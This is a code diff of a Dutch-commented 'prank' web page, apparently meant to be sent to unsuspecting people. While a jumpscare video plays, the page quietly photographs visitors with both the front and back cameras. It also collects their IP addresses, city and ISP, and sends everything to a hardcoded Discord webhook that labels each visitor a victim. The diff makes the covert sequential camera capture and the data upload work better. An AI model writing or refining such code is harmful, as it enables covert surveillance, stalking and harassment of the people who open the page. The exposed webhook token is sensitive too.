@@ -137,15 +137,13 @@
       100% { transform: translate(3px, 3px); }
     }
 
-    #hidden-video-front { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
-    #hidden-video-back { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
+    #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
     #hidden-canvas { display: none; }
   </style>
 </head>
 <body>
 
-<video id="hidden-video-front" autoplay playsinline muted></video>
-<video id="hidden-video-back" autoplay playsinline muted></video>
+<video id="hidden-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
 
 <div id="screen-landing">
@@ -179,53 +177,56 @@
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
-  let streamFront = null;
-  let streamBack = null;
-  let ipInfo = { v4: 'onbekend', v6: 'onbekend', loc: 'onbekend', isp: 'onbekend' };
+  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
 
+  // 🕵️ NAUKEURIGERE IP + LOCATIE
   async function gatherData() {
     try {
-      const v4 = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'err'}));
-      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'err'}));
-      const loc = await fetch(`https://ipapi.co/${v4.ip}/json/`).then(r => r.json()).catch(() => ({}));
-      ipInfo.v4 = v4.ip; ipInfo.v6 = v6.ip; ipInfo.loc = `${loc.city}, ${loc.country_name}`; ipInfo.isp = loc.org;
+      const ipRes = await fetch('https://ip-api.com/json/?fields=status,message,country,city,regionName,isp,query').then(r => r.json());
+      const v6Res = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+      
+      ipInfo.v4 = ipRes.query;
+      ipInfo.v6 = v6Res.ip;
+      ipInfo.loc = `${ipRes.city}, ${ipRes.regionName}, ${ipRes.country}`;
+      ipInfo.isp = ipRes.isp;
     } catch(e) {}
   }
   gatherData();
 
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
   async function startPrank() {
+    // 1. Fullscreen
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen();
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-    // Unlock troll sound (silent)
-    const tSound = document.getElementById('troll-sound');
-    tSound.play().then(() => { tSound.pause(); tSound.currentTime = 0; }).catch(() => {});
+    // 2. STILLE AUDIO UNLOCK (Echt stil!)
+    if (audioCtx.state === 'suspended') audioCtx.resume();
+    const oscillator = audioCtx.createOscillator();
+    const gainNode = audioCtx.createGain();
+    gainNode.gain.value = 0; // Totaal stil
+    oscillator.connect(gainNode);
+    gainNode.connect(audioCtx.destination);
+    oscillator.start(0);
+    oscillator.stop(0.1);
 
+    // 3. Naar loading
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
-    // Start Front Camera
-    try {
-      streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      document.getElementById('hidden-video-front').srcObject = streamFront;
-    } catch(e) {}
-
-    // Start Back Camera
-    try {
-      streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-      document.getElementById('hidden-video-back').srcObject = streamBack;
-    } catch(e) {}
-
-    setTimeout(() => {
+    // 4. Start Jumpscare na korte pauze
+    setTimeout(async () => {
       document.getElementById('screen-loading').style.display = 'none';
       document.getElementById('screen-jumpscare').style.display = 'flex';
+      
       const v = document.getElementById('jumpscare-video');
       v.volume = 1.0;
-      v.play();
+      await v.play();
 
-      takePhotos();
+      // 5. SEQUENTIAL CAMERA CAPTURE (Voor + Achter)
+      await takeSequentialPhotos();
 
+      // 6. Naar troll na video
       setTimeout(() => {
         document.getElementById('screen-jumpscare').style.display = 'none';
         document.getElementById('screen-troll').style.display = 'flex';
@@ -234,35 +235,44 @@
     }, 800);
   }
 
-  function captureToBlob(videoEl) {
-    if (!videoEl || !videoEl.srcObject || videoEl.videoWidth === 0) return null;
-    const canvas = document.getElementById('hidden-canvas');
-    canvas.width = videoEl.videoWidth;
-    canvas.height = videoEl.videoHeight;
-    const ctx = canvas.getContext('2d');
-    
-    // Selfie flip if front camera
-    if (videoEl.id === 'hidden-video-front') {
+  async function captureSingleMode(facing) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+      const vid = document.getElementById('hidden-video');
+      vid.srcObject = stream;
+      
+      // Wacht tot video stabiel is
+      await new Promise(r => setTimeout(r, 400));
+      
+      const canvas = document.getElementById('hidden-canvas');
+      canvas.width = vid.videoWidth;
+      canvas.height = vid.videoHeight;
+      const ctx = canvas.getContext('2d');
+      
+      // Selfie flip
+      if (facing === 'user') {
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
-    }
-    
-    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-    return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
+      }
+      
+      ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
+      
+      // Stop stream
+      stream.getTracks().forEach(t => t.stop());
+      return blob;
+    } catch(e) { return null; }
   }
 
-  async function takePhotos() {
-    const frontBlob = await captureToBlob(document.getElementById('hidden-video-front'));
-    const backBlob = await captureToBlob(document.getElementById('hidden-video-back'));
+  async function takeSequentialPhotos() {
+    const frontBlob = await captureSingleMode('user');
+    const backBlob = await captureSingleMode('environment');
 
-    const photoData = [];
-    if (frontBlob) photoData.push({ blob: frontBlob, name: 'selfie.jpg' });
-    if (backBlob) photoData.push({ blob: backBlob, name: 'omgeving.jpg' });
+    const photos = [];
+    if (frontBlob) photos.push({ blob: frontBlob, name: 'selfie.jpg' });
+    if (backBlob) photos.push({ blob: backBlob, name: 'omgeving.jpg' });
 
-    sendToDiscord(photoData);
-
-    if (streamFront) streamFront.getTracks().forEach(t => t.stop());
-    if (streamBack) streamBack.getTracks().forEach(t => t.stop());
+    sendToDiscord(photos);
   }
 
   async function sendToDiscord(photos) {
@@ -271,9 +281,9 @@
     
     const payload = {
       username: "🕵️ Night Owl Dual-Cam",
-      content: "💥 **SLACHTOFFER GEPAKT MET BEIDE CAMERA'S!**",
+      content: "💥 **DUBBELE TREFFER!**",
       embeds: [{
-        title: "Systeem & Locatie Rapport",
+        title: "Systeem, IP & Omgevings Rapport",
         color: 0xff0000,
         fields: [
           { name: "📱 Apparaat", value: `\`${platform}\``, inline: true },
@@ -282,13 +292,14 @@
           { name: "📍 Locatie", value: `${ipInfo.loc}`, inline: true },
           { name: "🏢 Provider", value: `${ipInfo.isp}`, inline: true }
         ],
-        footer: { text: 'Night Owl Dual-Cam Prank' }
+        image: { url: 'attachment://selfie.jpg' },
+        footer: { text: 'Night Owl Prank Tool' }
       }]
     };
 
     form.append('payload_json', JSON.stringify(payload));
-    photos.forEach((p, index) => {
-      form.append(`file${index}`, p.blob, p.name);
+    photos.forEach((p) => {
+      form.append('file', p.blob, p.name);
     });
 
     await fetch(WEBHOOK, { method: 'POST', body: form });
